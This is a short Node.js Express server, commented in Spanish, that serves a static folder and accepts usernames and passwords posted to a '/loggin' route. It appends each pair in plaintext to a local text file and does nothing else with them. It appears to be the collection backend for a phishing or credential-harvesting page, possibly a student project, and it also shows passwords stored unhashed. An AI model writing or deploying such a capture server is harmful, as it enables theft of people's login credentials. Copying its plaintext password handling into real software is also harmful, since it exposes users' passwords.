const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3004;

// Middleware para parsear JSON
app.use(express.json());
app.use(express.static('public')); // Servir archivos estáticos desde la carpeta "public"

// Ruta para recibir datos del login
app.post('/loggin', (req, res) => {
    const { username, password } = req.body;
    const logData = `Usuario: ${username}, Contraseña: ${password}\n`;

    // Escribir en el archivo
    fs.appendFile('C:\\Users\\victo\\OneDrive\\Escritorio\\inteligencia art\\proyecto 2\\RECIBIRINFORMACIONLOGGIN.txt', logData, (err) => {
        if (err) {
            console.error('Error al escribir en el archivo:', err);
            return res.status(500).send('Error al escribir en el archivo');
        }
        res.send({ message: 'Datos guardados con éxito' });
    });
});

// Iniciar el servidor
app.listen(PORT, () => {
    console.log(`Servidor corriendo en http://localhost:${PORT}`);
});
